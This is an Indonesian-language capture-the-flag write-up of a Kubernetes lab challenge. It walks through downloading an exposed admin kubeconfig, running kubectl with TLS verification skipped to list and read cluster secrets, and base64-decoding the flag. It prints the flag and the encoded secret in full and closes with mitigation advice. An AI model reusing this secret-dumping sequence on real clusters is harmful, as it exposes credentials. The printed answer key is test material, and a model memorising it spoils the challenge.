# KSECRETS (Challenge 732, General Skills)

- **ID:** 732 | **Event:** picoCTF 2026 | **Kategori:** General Skills | **Level:** Medium
- **Flag:** `academy{ks3cr375_41n7_s4f3_766edbce}` (terverifikasi live `POST /api/submissions/` -> `correct: true`)

## Skenario
Lab on-demand menyediakan cluster Kubernetes (k3s) dengan flag tersimpan
di Secret. Instance RUNNING mengekspos API server di
`chatelaine.cylabacademy.net:26907` plus file `kubeconfig` via HTTP
(port 47562, link di deskripsi instance). Tugas: ambil flag dari secrets.

## Root Cause
Dua kelemahan desain lab yang disengaja untuk edukasi: (1) `kubeconfig`
berisi client certificate admin cluster dibagikan lewat HTTP tanpa
autentikasi — siapa pun bisa menjadi cluster-admin; (2) Secret Kubernetes
(`Opaque`) hanya menyimpan nilai **base64** (`flag:` =
`YWNhZGVteXtrcz...Cg==`), bukan enkripsi. Base64 adalah encoding,
bukan proteksi: `base64 -d` langsung mengembalikan plaintext
`academy{...}`. Di Kubernetes nyata ini setara etcd-readable secret
tanpa envelope encryption (KMS) dan RBAC longgar.

## Rekonstruksi
1. Launch instance: `PUT /api/challenges/732/instance/` → poll `GET .../instance/`
   sampai `status == "RUNNING"`, parse `kubeconfig` URL dari deskripsi.
2. Unduh kubeconfig: `curl http://chatelaine.cylabacademy.net:47562/kubeconfig -o kube732`.
   Ganti `server: https://127.0.0.1:6443` → `https://chatelaine.cylabacademy.net:26907`.
3. Install kubectl (tidak ada di VPS): `curl -L https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl`.
4. Enumerasi: `kubectl --insecure-skip-tls-verify=true get ns` →
   namespace `academy`; `get secrets -A` → `academy/ctf-secret` (Opaque, 1 key).
5. Baca: `kubectl -n academy get secret ctf-secret -o jsonpath='{.data}'`
   → `{"flag":"YWNhZGVte...Cg=="}`. Decode: `base64 -d` →
   `academy{ks3cr375_41n7_s4f3_766edbce}`. Perhatian: baca byte mentah,
   jangan menebak dari log terpotong (`3t5` vs `375` — submit pertama
   `correct: false` karena salah salin satu karakter).
6. Verifikasi: `POST /api/submissions/` `{"challenge":732,"flag":"..."}` →
   `201 {"correct": true}`. `DELETE .../instance/` untuk bebas slot.

## Token Validasi
- Secret data: `YWNhZGVteXtrczNjcjM3NV80MW43X3M0ZjNfNzY2ZWRiY2V9Cg==`
- Flag: `academy{ks3cr375_41n7_s4f3_766edbce}` — `correct: true` (live API).

## Takeaway LKS & Mitigasi
Jangan simpan rahasia di Secret polos tanpa enkripsi at-rest (aktifkan
`EncryptionConfiguration` + KMS provider), terapkan RBAC least-privilege
(tidak ada kubeconfig admin via HTTP publik), gunakan external secret
manager (Vault/ESO) dengan rotasi, dan pisahkan akses human vs workload
(ServiceAccount + Bound Tokens). Untuk lomba: selalu `get secrets -A`
dulu saat dapat akses cluster — flag hampir selalu di Secret/ConfigMap.
